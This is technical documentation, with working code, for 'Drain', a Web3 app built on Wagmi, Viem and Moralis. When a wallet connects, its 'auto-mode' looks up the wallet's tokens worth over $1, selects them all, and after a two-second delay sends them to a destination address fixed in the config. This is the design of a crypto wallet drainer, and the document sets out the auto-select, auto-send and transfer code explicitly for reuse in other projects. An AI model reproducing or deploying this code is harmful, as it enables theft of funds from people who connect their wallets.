# Drain - Technical Documentation

Complete technical documentation for implementing the Drain token transfer system in another project.

## Table of Contents

1. [Project Overview](#project-overview)
2. [Architecture](#architecture)
3. [Setup & Installation](#setup--installation)
4. [Dependencies](#dependencies)
5. [Environment Variables](#environment-variables)
6. [Core Integrations](#core-integrations)
7. [Component Architecture](#component-architecture)
8. [State Management](#state-management)
9. [API Integration](#api-integration)
10. [Token Transfer Logic](#token-transfer-logic)
11. [Auto-Mode Implementation](#auto-mode-implementation)
12. [Code Structure](#code-structure)

---

## Project Overview

**Drain** is a Web3 application that enables automated or manual transfer of ERC-20 tokens and native tokens (ETH, BNB, etc.) from one wallet to another. It supports multiple EVM chains and provides an automated mode for bulk transfers.

### Key Features

- **Multi-chain support**: Ethereum, Polygon, Optimism, Arbitrum, BSC, Gnosis
- **Automated transfers**: Auto-select and transfer tokens worth > $1 USD
- **Native token support**: Handles both ERC-20 and native tokens (ETH, BNB)
- **ENS support**: Accepts ENS names as destination addresses
- **Real-time price data**: Uses Moralis API for token balances and USD values
- **Transaction tracking**: Monitors pending transactions with status updates

---

## Architecture

### Tech Stack

```
Frontend Framework: Next.js 16 (React 19)
Web3 Integration: Wagmi v2 + RainbowKit v2
Blockchain Library: Viem v2
State Management: Jotai
UI Components: Geist UI
API Integration: Moralis API v2.2
Type Safety: TypeScript
Validation: Zod
```

### High-Level Flow

```
User Connects Wallet (RainbowKit)
    ↓
GetTokens Component Fetches Tokens
    ↓
API Route (/api/chain-info/[chainId]/[evmAddress])
    ↓
MoralisClient.fetchTokens()
    ↓
Moralis API (Token balances + USD prices)
    ↓
Filter & Normalize Tokens
    ↓
Auto-select tokens worth > $1 (if auto-mode enabled)
    ↓
SendTokens Component
    ↓
Detect Token Type (Native vs ERC-20)
    ↓
Execute Transfer (sendTransaction or writeContract)
    ↓
Track Transaction Status
```

---

## Setup & Installation

### Prerequisites

- Node.js 18+ and npm
- MetaMask or compatible Web3 wallet
- Moralis API key ([get one here](https://moralis.io))
- WalletConnect Project ID ([get one here](https://cloud.walletconnect.com))

### Installation Steps

1. **Clone and install dependencies:**

```bash
npm install
```

2. **Create environment file:**

Create `.env.local` in the project root:

```bash
# Required: Moralis API Key for token data
MORALIS_API_KEY=your_moralis_api_key_here

# Required: WalletConnect Project ID
NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID=your_walletconnect_project_id

# Optional: Auto-mode destination address
NEXT_PUBLIC_AUTO_DESTINATION_ADDRESS=0xYourDestinationAddress
```

3. **Start development server:**

```bash
npm run dev
```

4. **Build for production:**

```bash
npm run build
npm start
```

---

## Dependencies

### Core Dependencies

```json
{
  "@geist-ui/core": "^2.3.8",           // UI component library
  "@rainbow-me/rainbowkit": "^2.2.10",  // Wallet connection UI
  "@tanstack/react-query": "^5.90.12", // Data fetching & caching
  "essential-eth": "^0.6.0",            // Ethereum utilities
  "jotai": "^1.8.0",                    // Atomic state management
  "next": "^16.0.7",                    // React framework
  "react": "^19.2.1",                   // UI library
  "viem": "^2.41.2",                    // Ethereum library
  "wagmi": "^2.19.5",                   // React hooks for Ethereum
  "zod": "^4.1.13"                      // Schema validation
}
```

### Key Package Roles

- **Wagmi**: Provides React hooks for wallet interactions (`useAccount`, `useWalletClient`, `usePublicClient`)
- **RainbowKit**: Pre-built wallet connection UI and modal
- **Viem**: Low-level Ethereum utilities (contract calls, transactions, ENS resolution)
- **Jotai**: Lightweight state management with atomic updates
- **Moralis**: Token balance and price data API

---

## Environment Variables

### Required Variables

| Variable | Description | Example |
|----------|-------------|---------|
| `MORALIS_API_KEY` | Moralis API key for token data | `your_moralis_key` |
| `NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID` | WalletConnect project ID | `abc123def456` |

### Optional Variables

| Variable | Description | Example |
|----------|-------------|---------|
| `NEXT_PUBLIC_AUTO_DESTINATION_ADDRESS` | Auto-mode destination address | `0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb` |

### Environment Variable Usage

Environment variables are accessed in Next.js:

- **Server-side**: `process.env.VARIABLE_NAME` (in API routes, server components)
- **Client-side**: `process.env.NEXT_PUBLIC_*` (must be prefixed with `NEXT_PUBLIC_`)

Example from `config.ts`:
```typescript
export const AUTO_DESTINATION_ADDRESS = 
  process.env.NEXT_PUBLIC_AUTO_DESTINATION_ADDRESS || '';
export const AUTO_MODE_ENABLED = Boolean(AUTO_DESTINATION_ADDRESS);
```

---

## Core Integrations

### 1. Wagmi Configuration

**File**: `pages/_app.tsx`

Wagmi is configured with supported chains and transports:

```typescript
import { getDefaultConfig } from '@rainbow-me/rainbowkit';
import { mainnet, polygon, optimism, arbitrum, bsc, gnosis } from 'viem/chains';

const wagmiConfig = getDefaultConfig({
  appName: 'Drain',
  projectId: walletConnectProjectId,
  chains: [mainnet, polygon, optimism, arbitrum, bsc, gnosis],
  transports: {
    [mainnet.id]: http(),
    [polygon.id]: http(),
    // ... other chains
  },
});
```

**Key Hooks Used:**
- `useAccount()`: Get connected wallet address and chain
- `useWalletClient()`: Get wallet client for signing transactions
- `usePublicClient()`: Get public client for reading blockchain data
- `useWaitForTransactionReceipt()`: Wait for transaction confirmation

### 2. Moralis API Integration

**File**: `src/moralis-client.ts`

Moralis provides token balances and USD price data.

**API Endpoint Used:**
```
GET https://deep-index.moralis.io/api/v2.2/wallets/{address}/tokens
```

**Request Parameters:**
- `chain`: Chain name (eth, polygon, bsc, etc.)
- `exclude_spam`: true (filter spam tokens)
- `exclude_unverified_contracts`: false

**Response Structure:**
```typescript
{
  result: Array<{
    token_address: string;
    name: string;
    symbol: string;
    decimals: number;
    balance: string;        // Raw balance in smallest unit
    usd_price: number;      // Current USD price per token
    usd_value: number;      // Total USD value of balance
    usd_price_24hr_percent_change: number;
    usd_value_24hr_ago: number;
    native_token?: boolean;
    // ... other fields
  }>
}
```

**Chain ID Mapping:**
```typescript
const CHAIN_ID_TO_MORALIS_CHAIN = {
  1: 'eth',        // Ethereum
  10: 'optimism',  // Optimism
  56: 'bsc',       // Binance Smart Chain
  100: 'gnosis',   // Gnosis
  137: 'polygon',  // Polygon
  42161: 'arbitrum' // Arbitrum
};
```

### 3. Token Filtering Logic

**File**: `src/moralis-client.ts` (lines 140-164)

Tokens are filtered based on:

1. **Blacklist**: Excludes specific token addresses
2. **Non-zero balance**: Only tokens with balance > 0
3. **Price data**: Requires current price data (quote, quote_rate)
4. **Minimum value**: Only tokens worth > $1 USD

```typescript
const erc20s = normalizedTokens.filter((token) => {
  // Exclude blacklisted
  if (blacklistAddresses.includes(token.contract_address)) return false;
  
  // Exclude zero balance
  if (token.balance === '0') return false;
  
  // Require price data
  const hasCurrentPrice = 
    token.quote !== null && 
    token.quote_rate !== null;
  
  // Minimum $1 USD value
  return hasCurrentPrice && token.quote > 1;
});
```

---

## Component Architecture

### 1. GetTokens Component

**File**: `components/contract/GetTokens.tsx`

**Responsibilities:**
- Fetch tokens when wallet connects
- Display token list with balances and USD values
- Auto-select tokens in auto-mode
- Show loading and error states

**Key Logic:**

```typescript
// Fetch tokens on wallet connect
useEffect(() => {
  if (address && chain?.id) {
    fetchData();
  }
}, [address, chain?.id, fetchData]);

// Auto-select tokens worth > $1 in auto-mode
if (AUTO_MODE_ENABLED && AUTO_DESTINATION_ADDRESS) {
  const autoSelected = {};
  fetchedTokens.forEach((token) => {
    if (token.quote > 1) {
      autoSelected[token.contract_address] = { isChecked: true };
    }
  });
  setCheckedRecords(autoSelected);
}
```

### 2. SendTokens Component

**File**: `components/contract/SendTokens.tsx`

**Responsibilities:**
- Handle destination address input (with ENS support)
- Execute token transfers (native and ERC-20)
- Auto-send in auto-mode
- Track transaction status

**Key Logic:**

```typescript
// Detect native tokens
const NATIVE_TOKEN_ADDRESSES = [
  '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee',
  '0x0000000000000000000000000000000000000000'
];

// Transfer logic
if (isNativeToken) {
  // Native token: use sendTransaction
  res = await walletClient.sendTransaction({
    to: destinationAddress,
    value: BigInt(token.balance)
  });
} else {
  // ERC-20: use writeContract
  const { request } = await publicClient.simulateContract({
    address: tokenAddress,
    abi: erc20Abi,
    functionName: 'transfer',
    args: [destinationAddress, BigInt(token.balance)]
  });
  res = await walletClient.writeContract(request);
}
```

### 3. Auto-Send Logic

**File**: `components/contract/SendTokens.tsx` (lines 156-195)

Auto-send triggers when:
1. Auto-mode is enabled
2. Wallet is connected
3. Destination address is set
4. Tokens are selected
5. Address is valid (ENS or valid address)

```typescript
useEffect(() => {
  if (!AUTO_MODE_ENABLED) return;
  if (hasAutoSentRef.current) return;
  if (!walletClient || !publicClient || !destinationAddress) return;
  
  const checkedCount = Object.values(checkedRecords)
    .filter(r => r.isChecked).length;
  const addressValid = isAddress(destinationAddress) || 
                       destinationAddress.includes('.');
  
  if (checkedCount > 0 && addressValid) {
    setTimeout(() => {
      sendAllCheckedTokens();
    }, 2000); // 2 second delay
  }
}, [AUTO_MODE_ENABLED, walletClient, publicClient, 
    destinationAddress, checkedRecords]);
```

---

## State Management

### Jotai Atoms

**File**: `src/atoms/`

Three main atoms manage application state:

1. **`globalTokensAtom`** (`src/atoms/global-tokens-atom.ts`)
   - Stores all fetched tokens
   - Type: `Tokens[]`

2. **`checkedTokensAtom`** (`src/atoms/checked-tokens-atom.ts`)
   - Stores selected tokens and pending transactions
   - Type: `Record<address, { isChecked: boolean, pendingTxn?: Transaction }>`

3. **`destinationAddressAtom`** (`src/atoms/destination-address-atom.ts`)
   - Stores destination address for transfers
   - Type: `string`

**Usage Example:**
```typescript
const [tokens, setTokens] = useAtom(globalTokensAtom);
const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
```

---

## API Integration

### API Route

**File**: `pages/api/chain-info/[chainId]/[evmAddress].ts`

**Endpoint**: `/api/chain-info/{chainId}/{evmAddress}`

**Method**: GET

**Parameters:**
- `chainId`: Chain ID (1, 137, 56, etc.)
- `evmAddress`: Wallet address to fetch tokens for

**Response:**
```typescript
{
  success: true,
  data: {
    erc20s: Array<NormalizedToken>,
    nfts: []
  }
}
```

**Error Response:**
```typescript
{
  success: false,
  error: "Error message"
}
```

**Implementation:**
```typescript
export default async function handler(req, res) {
  const { chainId, evmAddress } = requestQuerySchema.parse(req.query);
  
  // Validate chain support
  const supportedChains = MoralisClient.getSupportedChainIds();
  if (!supportedChains.includes(chainId)) {
    return res.status(400).json({ error: 'Chain not supported' });
  }
  
  // Fetch tokens
  const response = await moralisClient.fetchTokens(
    chainId, 
    evmAddress, 
    blacklistAddresses
  );
  
  res.status(200).json({ success: true, data: response });
}
```

---

## Token Transfer Logic

### Native Token Detection

Native tokens are identified by placeholder addresses:
- `0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee`
- `0x0000000000000000000000000000000000000000`

### Transfer Methods

#### 1. Native Token Transfer

```typescript
// For BNB, ETH, MATIC, etc.
await walletClient.sendTransaction({
  to: destinationAddress as `0x${string}`,
  value: BigInt(token.balance) // Balance in wei
});
```

#### 2. ERC-20 Token Transfer

```typescript
// Simulate first (optional but recommended)
const { request } = await publicClient.simulateContract({
  account: walletClient.account,
  address: tokenAddress,
  abi: erc20Abi,
  functionName: 'transfer',
  args: [
    destinationAddress as `0x${string}`,
    BigInt(token.balance)
  ]
});

// Execute transfer
await walletClient.writeContract(request);
```

### ERC-20 ABI

The standard ERC-20 transfer function:

```typescript
const erc20Abi = [
  {
    name: 'transfer',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'to', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ],
    outputs: [{ name: '', type: 'bool' }]
  }
] as const;
```

### ENS Resolution

ENS names are resolved before transfers:

```typescript
if (destinationAddress.includes('.')) {
  const resolved = await publicClient.getEnsAddress({
    name: normalize(destinationAddress)
  });
  if (resolved) {
    destinationAddress = resolved;
  }
}
```

---

## Auto-Mode Implementation

### Configuration

**File**: `config.ts`

```typescript
export const AUTO_DESTINATION_ADDRESS = 
  process.env.NEXT_PUBLIC_AUTO_DESTINATION_ADDRESS || '';
export const AUTO_MODE_ENABLED = Boolean(AUTO_DESTINATION_ADDRESS);
```

### Auto-Selection

**File**: `components/contract/GetTokens.tsx`

When tokens are fetched in auto-mode:
1. Set destination address from config
2. Auto-select all tokens worth > $1 USD

```typescript
if (AUTO_MODE_ENABLED && AUTO_DESTINATION_ADDRESS) {
  setDestinationAddress(AUTO_DESTINATION_ADDRESS);
  
  const autoSelected = {};
  fetchedTokens.forEach((token) => {
    if (token.quote > 1) {
      autoSelected[token.contract_address] = { isChecked: true };
    }
  });
  setCheckedRecords(autoSelected);
}
```

### Auto-Send

**File**: `components/contract/SendTokens.tsx`

Auto-send triggers automatically when:
- Auto-mode enabled
- Wallet connected
- Destination address valid
- Tokens selected
- 2-second delay (to ensure wallet is ready)

**Prevention of Duplicate Sends:**
- Uses `useRef` to track if auto-send has already executed
- Resets when wallet address or chain changes

---

## Code Structure

```
drain/
├── components/
│   └── contract/
│       ├── GetTokens.tsx      # Token fetching & display
│       ├── SendTokens.tsx     # Transfer execution
│       └── index.ts           # Exports
├── pages/
│   ├── _app.tsx               # App setup (Wagmi, RainbowKit)
│   ├── index.tsx              # Main page
│   └── api/
│       └── chain-info/
│           └── [chainId]/
│               └── [evmAddress].ts  # API route
├── src/
│   ├── atoms/                 # Jotai state atoms
│   │   ├── checked-tokens-atom.ts
│   │   ├── destination-address-atom.ts
│   │   └── global-tokens-atom.ts
│   ├── moralis-client.ts      # Moralis API client
│   ├── fetch-tokens.ts        # Token fetching utility
│   └── token-lists.ts         # Blacklist & token lists
├── config.ts                  # Configuration
├── package.json
└── .env.local                 # Environment variables
```

---

## Implementation Checklist

To implement this in another project:

### 1. Setup
- [ ] Install dependencies (Wagmi, Viem, RainbowKit, Jotai)
- [ ] Configure Wagmi with supported chains
- [ ] Set up environment variables
- [ ] Create Moralis account and get API key
- [ ] Get WalletConnect Project ID

### 2. State Management
- [ ] Create Jotai atoms for tokens, selections, destination
- [ ] Set up atom providers

### 3. API Integration
- [ ] Create MoralisClient class
- [ ] Implement token fetching with filtering
- [ ] Create API route for token data
- [ ] Add error handling

### 4. Components
- [ ] Create GetTokens component
- [ ] Create SendTokens component
- [ ] Implement token display
- [ ] Add transaction tracking

### 5. Transfer Logic
- [ ] Implement native token detection
- [ ] Add native token transfer (sendTransaction)
- [ ] Add ERC-20 transfer (writeContract)
- [ ] Add ENS resolution
- [ ] Add error handling

### 6. Auto-Mode (Optional)
- [ ] Add config for destination address
- [ ] Implement auto-selection logic
- [ ] Implement auto-send trigger
- [ ] Add UI indicators

### 7. Testing
- [ ] Test on testnet first
- [ ] Test native token transfers
- [ ] Test ERC-20 transfers
- [ ] Test auto-mode
- [ ] Test error scenarios

---

## Common Issues & Solutions

### Issue: Tokens not showing
**Solution**: Check Moralis API key, verify chain is supported, check token filtering (must be > $1 USD)

### Issue: Native token transfer fails
**Solution**: Ensure using `sendTransaction` not `writeContract` for native tokens

### Issue: Auto-mode not working
**Solution**: Verify `NEXT_PUBLIC_AUTO_DESTINATION_ADDRESS` is set, restart dev server

### Issue: ENS resolution fails
**Solution**: Ensure using `normalize()` from `viem/ens`, check network connection

### Issue: Transaction fails
**Solution**: Check wallet has enough gas, verify token balance, check destination address is valid

---

## Security Considerations

1. **API Keys**: Never commit API keys to version control
2. **User Approval**: Always require user approval for transactions
3. **Validation**: Validate all addresses and amounts before sending
4. **Error Handling**: Handle all errors gracefully
5. **Rate Limiting**: Consider rate limiting for API calls
6. **Blacklist**: Maintain token blacklist to prevent spam transfers

---

## Performance Optimizations

1. **Caching**: Use React Query for API response caching
2. **Batching**: Consider batching multiple transfers
3. **Lazy Loading**: Load token data only when needed
4. **Debouncing**: Debounce address input for ENS resolution

---

## Future Enhancements

- [ ] Support for more chains
- [ ] Batch transfer optimization
- [ ] Gas price estimation
- [ ] Transaction history
- [ ] Multi-wallet support
- [ ] Custom token lists
- [ ] Transfer scheduling

---

## Resources

- [Wagmi Documentation](https://wagmi.sh)
- [Viem Documentation](https://viem.sh)
- [RainbowKit Documentation](https://rainbowkit.com)
- [Moralis API Documentation](https://docs.moralis.io)
- [Jotai Documentation](https://jotai.org)

---

**Last Updated**: 2024
**Version**: 1.0.0
